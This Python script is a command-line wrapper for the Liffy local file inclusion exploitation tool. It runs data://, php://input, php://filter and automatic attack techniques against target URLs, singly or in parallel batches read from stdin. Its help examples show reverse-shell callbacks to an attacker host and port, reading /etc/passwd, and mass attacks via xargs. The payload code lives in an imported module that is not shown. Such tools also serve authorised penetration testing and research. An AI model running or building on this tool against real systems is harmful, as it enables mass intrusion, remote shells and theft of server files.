#!/usr/bin/env python3
"""
Liffy Techniques - Fast LFI testing with technique-specific commands
Supports xargs, parallel, and batch processing for efficient testing
"""

__author__ = 'rotlogix'
__author__ = 'unicornFurnace'
__version__ = '2.1.0'

import argparse
import sys
import requests
from urllib.parse import urlparse, quote_plus, urljoin
import time
import core_enhanced
import datetime
import logging
import json
import os
from pathlib import Path
from typing import Optional, Dict, List, Any
import threading
import subprocess
from dataclasses import dataclass
from enum import Enum
import ip_utils
import multiprocessing
from concurrent.futures import ThreadPoolExecutor, as_completed
import signal

# Enhanced terminal colors and formatting
try:
    from blessings import Terminal
    t = Terminal()
except ImportError:
    class Terminal:
        def __getattr__(self, name):
            return lambda x: x
    t = Terminal()

class Technique(Enum):
    DATA = "data"
    INPUT = "input"
    EXPECT = "expect"
    ENVIRON = "environ"
    ACCESS = "access"
    SSH = "ssh"
    FILTER = "filter"
    ZIP = "zip"
    PHAR = "phar"
    COMPRESS = "compress"
    AUTO = "auto"

@dataclass
class LiffyConfig:
    target_url: str
    technique: Technique
    lhost: Optional[str] = None
    lport: Optional[int] = None
    auto_ip: bool = False
    auto_port: bool = False
    nostager: bool = False
    payload: Optional[str] = None
    location: Optional[str] = None
    relative: bool = False
    cookies: Optional[str] = None
    user_agent: Optional[str] = None
    proxy: Optional[str] = None
    timeout: int = 30
    verbose: bool = False
    output: Optional[str] = None
    threads: int = 1
    file: Optional[str] = None

class LiffyTechniques:
    """Enhanced Liffy with technique-specific commands and parallel processing"""
    
    def __init__(self, config: LiffyConfig):
        self.config = config
        self.logger = self._setup_logger()
        self.ui = LiffyUI(self.logger)
        self.results = []
        
    def _setup_logger(self) -> logging.Logger:
        """Setup logging configuration"""
        logger = logging.getLogger('liffy_techniques')
        logger.setLevel(logging.DEBUG if self.config.verbose else logging.INFO)
        
        if not logger.handlers:
            handler = logging.StreamHandler()
            formatter = logging.Formatter(
                '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
            )
            handler.setFormatter(formatter)
            logger.addHandler(handler)
            
            if self.config.output:
                file_handler = logging.FileHandler(self.config.output)
                file_handler.setFormatter(formatter)
                logger.addHandler(file_handler)
        
        return logger
    
    def execute_technique(self, url: str) -> Dict[str, Any]:
        """Execute the specified technique on a single URL"""
        result = {
            'url': url,
            'technique': self.config.technique.value,
            'success': False,
            'error': None,
            'timestamp': datetime.datetime.now().isoformat()
        }
        
        try:
            # Update config with current URL
            current_config = LiffyConfig(
                target_url=url,
                technique=self.config.technique,
                lhost=self.config.lhost,
                lport=self.config.lport,
                auto_ip=self.config.auto_ip,
                auto_port=self.config.auto_port,
                nostager=self.config.nostager,
                payload=self.config.payload,
                location=self.config.location,
                relative=self.config.relative,
                cookies=self.config.cookies,
                user_agent=self.config.user_agent,
                proxy=self.config.proxy,
                timeout=self.config.timeout,
                verbose=self.config.verbose,
                output=self.config.output,
                threads=self.config.threads,
                file=self.config.file
            )
            
            # Execute technique based on type
            if self.config.technique == Technique.DATA:
                exploit = core_enhanced.DataEnhanced(current_config, self.logger, self.ui)
                exploit.execute()
            elif self.config.technique == Technique.INPUT:
                exploit = core_enhanced.InputEnhanced(current_config, self.logger, self.ui)
                exploit.execute()
            elif self.config.technique == Technique.EXPECT:
                exploit = core_enhanced.ExpectEnhanced(current_config, self.logger, self.ui)
                exploit.execute()
            elif self.config.technique == Technique.ENVIRON:
                exploit = core_enhanced.EnvironEnhanced(current_config, self.logger, self.ui)
                exploit.execute()
            elif self.config.technique == Technique.ACCESS:
                exploit = core_enhanced.AccessLogsEnhanced(current_config, self.logger, self.ui)
                exploit.execute()
            elif self.config.technique == Technique.SSH:
                exploit = core_enhanced.SSHLogsEnhanced(current_config, self.logger, self.ui)
                exploit.execute()
            elif self.config.technique == Technique.FILTER:
                exploit = core_enhanced.FilterEnhanced(current_config, self.logger, self.ui)
                exploit.execute()
            elif self.config.technique == Technique.ZIP:
                exploit = core_enhanced.ZipEnhanced(current_config, self.logger, self.ui)
                exploit.execute()
            elif self.config.technique == Technique.PHAR:
                exploit = core_enhanced.PharEnhanced(current_config, self.logger, self.ui)
                exploit.execute()
            elif self.config.technique == Technique.COMPRESS:
                exploit = core_enhanced.CompressEnhanced(current_config, self.logger, self.ui)
                exploit.execute()
            elif self.config.technique == Technique.AUTO:
                exploit = core_enhanced.AutoExploit(current_config, self.logger, self.ui)
                exploit.execute()
            
            result['success'] = True
            
        except Exception as e:
            result['error'] = str(e)
            self.logger.error(f"Error executing technique on {url}: {str(e)}")
        
        return result
    
    def process_urls_parallel(self, urls: List[str]) -> List[Dict[str, Any]]:
        """Process multiple URLs in parallel"""
        results = []
        
        with ThreadPoolExecutor(max_workers=self.config.threads) as executor:
            future_to_url = {
                executor.submit(self.execute_technique, url): url 
                for url in urls
            }
            
            for future in as_completed(future_to_url):
                url = future_to_url[future]
                try:
                    result = future.result()
                    results.append(result)
                    self.ui.info(f"Processed {url}: {'SUCCESS' if result['success'] else 'FAILED'}")
                except Exception as e:
                    self.logger.error(f"Error processing {url}: {str(e)}")
                    results.append({
                        'url': url,
                        'technique': self.config.technique.value,
                        'success': False,
                        'error': str(e),
                        'timestamp': datetime.datetime.now().isoformat()
                    })
        
        return results
    
    def process_urls_sequential(self, urls: List[str]) -> List[Dict[str, Any]]:
        """Process multiple URLs sequentially"""
        results = []
        
        for i, url in enumerate(urls, 1):
            self.ui.info(f"Processing {i}/{len(urls)}: {url}")
            result = self.execute_technique(url)
            results.append(result)
            
            if result['success']:
                self.ui.success(f"SUCCESS: {url}")
            else:
                self.ui.error(f"FAILED: {url} - {result.get('error', 'Unknown error')}")
        
        return results

class LiffyUI:
    """Enhanced UI for Liffy Techniques"""
    
    def __init__(self, logger):
        self.logger = logger
    
    def info(self, message: str):
        print(t.cyan(f"[INFO] {message}"))
        self.logger.info(message)
    
    def success(self, message: str):
        print(t.green(f"[SUCCESS] {message}"))
        self.logger.info(f"SUCCESS: {message}")
    
    def error(self, message: str):
        print(t.red(f"[ERROR] {message}"))
        self.logger.error(message)
    
    def warning(self, message: str):
        print(t.yellow(f"[WARNING] {message}"))
        self.logger.warning(message)

def create_technique_commands():
    """Create technique-specific command functions"""
    
    def data_cmd(args):
        """data:// technique command"""
        if not args.batch and not args.url:
            print("Error: --url is required when not using --batch mode")
            sys.exit(1)
        
        config = LiffyConfig(
            target_url=args.url or "",
            technique=Technique.DATA,
            lhost=args.lhost,
            lport=args.lport,
            auto_ip=args.auto_ip,
            auto_port=args.auto_port,
            nostager=args.nostager,
            cookies=args.cookies,
            user_agent=args.user_agent,
            proxy=args.proxy,
            timeout=args.timeout,
            verbose=args.verbose,
            output=args.output,
            threads=args.threads
        )
        
        liffy = LiffyTechniques(config)
        if args.batch:
            urls = [line.strip() for line in sys.stdin if line.strip()]
            if args.parallel:
                results = liffy.process_urls_parallel(urls)
            else:
                results = liffy.process_urls_sequential(urls)
            
            # Output results in JSON format for further processing
            if args.json:
                print(json.dumps(results, indent=2))
        else:
            liffy.execute_technique(args.url)
    
    def input_cmd(args):
        """php://input technique command"""
        if not args.batch and not args.url:
            print("Error: --url is required when not using --batch mode")
            sys.exit(1)
        
        config = LiffyConfig(
            target_url=args.url or "",
            technique=Technique.INPUT,
            lhost=args.lhost,
            lport=args.lport,
            auto_ip=args.auto_ip,
            auto_port=args.auto_port,
            nostager=args.nostager,
            cookies=args.cookies,
            user_agent=args.user_agent,
            proxy=args.proxy,
            timeout=args.timeout,
            verbose=args.verbose,
            output=args.output,
            threads=args.threads
        )
        
        liffy = LiffyTechniques(config)
        if args.batch:
            urls = [line.strip() for line in sys.stdin if line.strip()]
            if args.parallel:
                results = liffy.process_urls_parallel(urls)
            else:
                results = liffy.process_urls_sequential(urls)
            
            if args.json:
                print(json.dumps(results, indent=2))
        else:
            liffy.execute_technique(args.url)
    
    def filter_cmd(args):
        """php://filter technique command"""
        if not args.batch and not args.url:
            print("Error: --url is required when not using --batch mode")
            sys.exit(1)
        
        config = LiffyConfig(
            target_url=args.url or "",
            technique=Technique.FILTER,
            file=args.file,
            cookies=args.cookies,
            user_agent=args.user_agent,
            proxy=args.proxy,
            timeout=args.timeout,
            verbose=args.verbose,
            output=args.output,
            threads=args.threads
        )
        
        liffy = LiffyTechniques(config)
        if args.batch:
            urls = [line.strip() for line in sys.stdin if line.strip()]
            if args.parallel:
                results = liffy.process_urls_parallel(urls)
            else:
                results = liffy.process_urls_sequential(urls)
            
            if args.json:
                print(json.dumps(results, indent=2))
        else:
            liffy.execute_technique(args.url)
    
    def auto_cmd(args):
        """Automatic technique detection command"""
        if not args.batch and not args.url:
            print("Error: --url is required when not using --batch mode")
            sys.exit(1)
        
        config = LiffyConfig(
            target_url=args.url or "",
            technique=Technique.AUTO,
            lhost=args.lhost,
            lport=args.lport,
            auto_ip=args.auto_ip,
            auto_port=args.auto_port,
            cookies=args.cookies,
            user_agent=args.user_agent,
            proxy=args.proxy,
            timeout=args.timeout,
            verbose=args.verbose,
            output=args.output,
            threads=args.threads
        )
        
        liffy = LiffyTechniques(config)
        if args.batch:
            urls = [line.strip() for line in sys.stdin if line.strip()]
            if args.parallel:
                results = liffy.process_urls_parallel(urls)
            else:
                results = liffy.process_urls_sequential(urls)
            
            if args.json:
                print(json.dumps(results, indent=2))
        else:
            liffy.execute_technique(args.url)
    
    return {
        'data': data_cmd,
        'input': input_cmd,
        'filter': filter_cmd,
        'auto': auto_cmd
    }

def create_parser():
    """Create argument parser for technique commands"""
    parser = argparse.ArgumentParser(
        description="Liffy Techniques - Fast LFI testing with technique-specific commands",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Single URL testing
  liffy-techniques data --url "http://target/file.php?page=" --lhost 192.168.1.100 --lport 4444
  
  # Batch processing with xargs
  cat urls.txt | xargs -I {} liffy-techniques data --url "{}" --lhost 192.168.1.100 --lport 4444
  
  # Parallel batch processing
  cat urls.txt | liffy-techniques data --batch --parallel --lhost 192.168.1.100 --lport 4444
  
  # Filter technique for file reading
  liffy-techniques filter --url "http://target/file.php?page=" --file "/etc/passwd"
  
  # Auto technique detection
  liffy-techniques auto --url "http://target/file.php?page=" --auto-ip --auto-port
  
  # JSON output for further processing
  cat urls.txt | liffy-techniques data --batch --json --lhost 192.168.1.100 --lport 4444
        """
    )
    
    subparsers = parser.add_subparsers(dest='technique', help='Available techniques')
    
    # Data technique
    data_parser = subparsers.add_parser('data', help='data:// technique')
    data_parser.add_argument('--url', help='Target URL with LFI parameter')
    data_parser.add_argument('--lhost', help='Callback host for reverse shells')
    data_parser.add_argument('--lport', type=int, help='Callback port for reverse shells')
    data_parser.add_argument('--auto-ip', action='store_true', help='Auto-detect IP address')
    data_parser.add_argument('--auto-port', action='store_true', help='Auto-detect available port')
    data_parser.add_argument('--nostager', action='store_true', help='Execute payload directly without stager')
    data_parser.add_argument('--batch', action='store_true', help='Process URLs from stdin')
    data_parser.add_argument('--parallel', action='store_true', help='Process URLs in parallel')
    data_parser.add_argument('--json', action='store_true', help='Output results in JSON format')
    data_parser.add_argument('--threads', type=int, default=4, help='Number of parallel threads')
    data_parser.add_argument('--cookies', help='Session cookies')
    data_parser.add_argument('--user-agent', help='Custom User-Agent string')
    data_parser.add_argument('--proxy', help='HTTP proxy (http://proxy:port)')
    data_parser.add_argument('--timeout', type=int, default=30, help='Request timeout in seconds')
    data_parser.add_argument('--verbose', '-v', action='store_true', help='Verbose output')
    data_parser.add_argument('--output', '-o', help='Output file for logs')
    
    # Input technique
    input_parser = subparsers.add_parser('input', help='php://input technique')
    input_parser.add_argument('--url', help='Target URL with LFI parameter')
    input_parser.add_argument('--lhost', help='Callback host for reverse shells')
    input_parser.add_argument('--lport', type=int, help='Callback port for reverse shells')
    input_parser.add_argument('--auto-ip', action='store_true', help='Auto-detect IP address')
    input_parser.add_argument('--auto-port', action='store_true', help='Auto-detect available port')
    input_parser.add_argument('--nostager', action='store_true', help='Execute payload directly without stager')
    input_parser.add_argument('--batch', action='store_true', help='Process URLs from stdin')
    input_parser.add_argument('--parallel', action='store_true', help='Process URLs in parallel')
    input_parser.add_argument('--json', action='store_true', help='Output results in JSON format')
    input_parser.add_argument('--threads', type=int, default=4, help='Number of parallel threads')
    input_parser.add_argument('--cookies', help='Session cookies')
    input_parser.add_argument('--user-agent', help='Custom User-Agent string')
    input_parser.add_argument('--proxy', help='HTTP proxy (http://proxy:port)')
    input_parser.add_argument('--timeout', type=int, default=30, help='Request timeout in seconds')
    input_parser.add_argument('--verbose', '-v', action='store_true', help='Verbose output')
    input_parser.add_argument('--output', '-o', help='Output file for logs')
    
    # Filter technique
    filter_parser = subparsers.add_parser('filter', help='php://filter technique')
    filter_parser.add_argument('--url', help='Target URL with LFI parameter')
    filter_parser.add_argument('--file', help='File to read (e.g., /etc/passwd)')
    filter_parser.add_argument('--batch', action='store_true', help='Process URLs from stdin')
    filter_parser.add_argument('--parallel', action='store_true', help='Process URLs in parallel')
    filter_parser.add_argument('--json', action='store_true', help='Output results in JSON format')
    filter_parser.add_argument('--threads', type=int, default=4, help='Number of parallel threads')
    filter_parser.add_argument('--cookies', help='Session cookies')
    filter_parser.add_argument('--user-agent', help='Custom User-Agent string')
    filter_parser.add_argument('--proxy', help='HTTP proxy (http://proxy:port)')
    filter_parser.add_argument('--timeout', type=int, default=30, help='Request timeout in seconds')
    filter_parser.add_argument('--verbose', '-v', action='store_true', help='Verbose output')
    filter_parser.add_argument('--output', '-o', help='Output file for logs')
    
    # Auto technique
    auto_parser = subparsers.add_parser('auto', help='Automatic technique detection')
    auto_parser.add_argument('--url', help='Target URL with LFI parameter')
    auto_parser.add_argument('--lhost', help='Callback host for reverse shells')
    auto_parser.add_argument('--lport', type=int, help='Callback port for reverse shells')
    auto_parser.add_argument('--auto-ip', action='store_true', help='Auto-detect IP address')
    auto_parser.add_argument('--auto-port', action='store_true', help='Auto-detect available port')
    auto_parser.add_argument('--batch', action='store_true', help='Process URLs from stdin')
    auto_parser.add_argument('--parallel', action='store_true', help='Process URLs in parallel')
    auto_parser.add_argument('--json', action='store_true', help='Output results in JSON format')
    auto_parser.add_argument('--threads', type=int, default=4, help='Number of parallel threads')
    auto_parser.add_argument('--cookies', help='Session cookies')
    auto_parser.add_argument('--user-agent', help='Custom User-Agent string')
    auto_parser.add_argument('--proxy', help='HTTP proxy (http://proxy:port)')
    auto_parser.add_argument('--timeout', type=int, default=30, help='Request timeout in seconds')
    auto_parser.add_argument('--verbose', '-v', action='store_true', help='Verbose output')
    auto_parser.add_argument('--output', '-o', help='Output file for logs')
    
    return parser

def main():
    """Main function"""
    parser = create_parser()
    args = parser.parse_args()
    
    if not args.technique:
        parser.print_help()
        sys.exit(1)
    
    # Get technique command
    technique_commands = create_technique_commands()
    cmd_func = technique_commands.get(args.technique)
    
    if not cmd_func:
        print(f"Unknown technique: {args.technique}")
        sys.exit(1)
    
    # Execute technique command
    try:
        cmd_func(args)
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Error: {str(e)}")
        sys.exit(1)

if __name__ == "__main__":
    main()